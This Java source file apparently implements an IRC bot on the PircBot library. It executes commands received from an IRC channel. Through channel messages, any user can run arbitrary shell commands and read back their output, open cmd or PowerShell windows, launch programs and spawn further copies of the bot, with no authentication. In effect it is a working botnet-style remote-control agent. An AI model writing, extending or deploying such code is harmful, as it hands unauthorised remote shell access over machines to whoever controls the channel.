import org.jibble.pircbot.*;

import java.io.*;
import java.net.*;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.concurrent.Executor;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.function.Consumer;
import java.util.regex.*;
import java.util.Random;

public class TestBot extends PircBot{
    private int id;

    private final int MAX = 10;
    private Socket socket;

    private BufferedReader serverIn;
    private PrintStream clientOut;

    private Process serverJob;
    private Process terminal;

    private boolean isInitialized = false;

    private int port = 8080;
    private int currPort = port;

    private int[] botsList;
    private final ExecutorService jobs = Executors.newFixedThreadPool(MAX);

    public TestBot(){
        Random rand = new Random();
        this.id = rand.nextInt(100);
        byte[]bytes = new byte[7];
        rand.nextBytes(bytes);
        String name = new String(bytes, Charset.forName("UTF-8"));

        this.setName("B"+name.hashCode()+"T");
    }
    public boolean initiateClient(int port){
        try{
            socket = new Socket("localhost",port);
            serverIn = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            clientOut = new PrintStream(socket.getOutputStream());
        }catch(IOException e){
            e.printStackTrace();
            System.out.println("Error initiating client");
        }
        return false;
    }
    public Process terminalCommander(String command,boolean suppress){
        try{

            String start = suppress == true?"cmd /c start /B cmd.exe":"cmd /c start cmd.exe";
            String cmd = " /K \""+command+"\"";

            Process process = Runtime.getRuntime().exec(start+cmd);
            return process;
        }catch(Exception e){
            e.printStackTrace();
        }
        return null;
    }
    public void startTerminal(){
        try{
            String cmd = "cmd /c start cmd.exe /K \"ping localhost\"";
            Process process = Runtime.getRuntime().exec(cmd);
            process.wait(100000);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public void startPowerShell(){
        try{
            String cmd = "powershell.exe ";
            Process process = Runtime.getRuntime().exec(cmd);
            process.wait(100000);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public void startExeW(String program){
        String pgFiles = System.getenv("programfiles");
        String seperator = System.getProperty("file.seperator");

        String[] commands = {"cmd.exe",
                             "/c",
                             pgFiles +
                             seperator +
                             program +
                             seperator +
                             program+".exe"
                            };
        try{
            Runtime.getRuntime().exec(commands);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public void sendProcessToServer(String[]commands){
        Runnable task = ()->{
            try{
                StringBuffer cmd = new StringBuffer();

                for(int i=1;i<commands.length;i++){
                    cmd.append(commands[i]+" ");
                }
                tellServer("process");
                ProcessBuilder process = new ProcessBuilder("cmd","/C","start",cmd.toString());
                ObjectOutputStream outProcess = new ObjectOutputStream(socket.getOutputStream());
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                String response = in.readLine();
                outProcess.writeObject(process);

                outProcess.close();
                in.close();

            }catch(Exception e){
                e.printStackTrace();
            }
        };
        Thread thread = new Thread(task);
        jobs.submit(thread);
    }
    public String tellServer(String message){
        try{
            String remove = "#tell";
            message = message.replaceAll(remove,"");
            clientOut.println(this.id+": "+message);
            String response = serverIn.readLine();
            clientOut.flush();
            return response;

        }catch(Exception e){
            e.printStackTrace();
        }
        return null;
    }
    public boolean spawnClone(){
        try{
            String command = "javac -classpath pircbot.jar;. *.java && javaw -classpath pircbot.jar; TestBotMain main &";
            terminalCommander(command,false);
            return true;
        }catch(Exception e){
            e.printStackTrace();
        }
        return false;
    }
    public boolean initiateServer(String type){
        try{
            if(currPort != port){
                currPort = port;
            }

            String id = Integer.toString(this.id);
            String command = "java -classpath .;. Server "+id+" "+port++ +" "+type;
            serverJob = terminalCommander(command,false);
            initiateClient(currPort);
            return socket.isConnected();
        }catch(Exception e){
            e.printStackTrace();
        }
        return false;
    }
    public String directCommand(String commands){
        try{
            Process process = Runtime.getRuntime().exec(commands);

            BufferedReader input = new BufferedReader(new InputStreamReader(process.getInputStream()));

            StringBuffer ret = new StringBuffer();

            String temp;
            while((temp = input.readLine()) != null){
                ret.append(temp);
            }
            input.close();
            process.destroy();
            return ret.toString();
        }catch(Exception e){
            e.printStackTrace();
        }
        return "";
    }
    public void parseCommand(String[]commands){
        try{
            StringBuffer cmd = new StringBuffer();

            for(int i=1;i<commands.length;i++){
                cmd.append(commands[i]+" ");
            }
            terminal = terminalCommander(cmd.toString(),false);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public void handlePersonalCommand(String channel,String sender,String message){
        if (message.equalsIgnoreCase("#time")) {
            String time = new java.util.Date().toString();
            sendMessage(channel, sender+" the current Time is " + time);
        }
        if(message.split(" ")[0].equalsIgnoreCase("#start")){
            sendMessage(channel,"initiating server");
            String[] type = message.split(" ");
            if(initiateServer(type[1])){
                sendMessage(channel,"server init done of type "+type[1]);
            }else{
                sendMessage(channel,"Error starting bot services");
            }
        }
        if(message.equalsIgnoreCase("#isup")){
            sendMessage(channel,sender+" "+socket.isConnected());
        }
        if(message.equalsIgnoreCase("#terminal")){
            startTerminal();
        }
        if(message.equalsIgnoreCase("#powershell")){
            startPowerShell();
        }
        if(message.equalsIgnoreCase("#ports")){
            sendMessage(channel,sender+" current Port is "+currPort+" next port is "+port);
        }
        if(message.split(" ")[0].equalsIgnoreCase("#connect")){
            String[] commands = message.split(" ");
            int port = Integer.parseInt(commands[1]);
            initiateClient(port);
            sendMessage(channel,sender+" connecting to "+port);
        }
        if(message.split(" ")[0].equalsIgnoreCase("#sendProcess")){
            String[] commands = message.split(" ");
            sendProcessToServer(commands);
            sendMessage(channel,sender+ " process sent to "+currPort);
        }
        if(message.split(" ")[0].equalsIgnoreCase("#command")){
            String[] commands = message.split(" ");
            parseCommand(commands);
            sendMessage(channel,sender+" ~success");
        }
        if(message.contains("#clone")){
            sendMessage(channel,sender+" spawned clone "+spawnClone());
        }
        if(message.split(" ")[0].equalsIgnoreCase("#direct")){
            String[] commands = message.split(" ");
            StringBuffer cmd = new StringBuffer();

            for(int i=1;i<commands.length;i++){
                cmd.append(commands[i]+" ");
            }
            String response = directCommand(cmd.toString());
            sendMessage(channel,sender+" response "+response);
        }

        if(message.split(" ")[0].equalsIgnoreCase("#begin")){
            String program = message.split(" ")[1];
            startExeW(program);
        }
        if(message.split(" ")[0].equalsIgnoreCase("#tell")){
            sendMessage(channel,sender+" "+tellServer(message));
        }

    }
    public void onMessage(String channel,String sender,String login,String hostName,String message) {
        if (message.equalsIgnoreCase("#time")) {
            String time = new java.util.Date().toString();
            sendMessage(channel, sender+" the current Time is " + time);
        }
        if(message.equalsIgnoreCase("#identify")){
            sendMessage(channel,sender+" ID="+id);
        }
        if(message.split(" ")[0].equalsIgnoreCase("#catch")){
            String[] input = message.split(" ");
            StringBuffer command = new StringBuffer();
            if(input[1].equalsIgnoreCase(Integer.toString(id))){
                for(int i=2;i<input.length;i++){
                    command.append(input[i]+" ");
                }
                if(command.toString().contains("#close")){
                    try{
                        disconnect();
                        serverIn.close();
                        clientOut.close();
                        System.exit(0);
                    }catch(Exception e){
                        e.printStackTrace();
                    }
                }else{
                    handlePersonalCommand(channel,sender, command.toString());
                    sendMessage(channel,sender+": bot "+id+" received message "+command.toString());
                }
            }
        }
        if(isInitialized){
            try{
                serverJob.waitFor();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }
    private static class StreamGobbler implements Runnable {
        private InputStream inputStream;
        private Consumer<String> consumer;

        public StreamGobbler(InputStream inputStream, Consumer<String> consumer) {
            this.inputStream = inputStream;
            this.consumer = consumer;
        }

        @Override
        public void run() {
            new BufferedReader(new InputStreamReader(inputStream)).lines()
                    .forEach(consumer);
        }
    }
}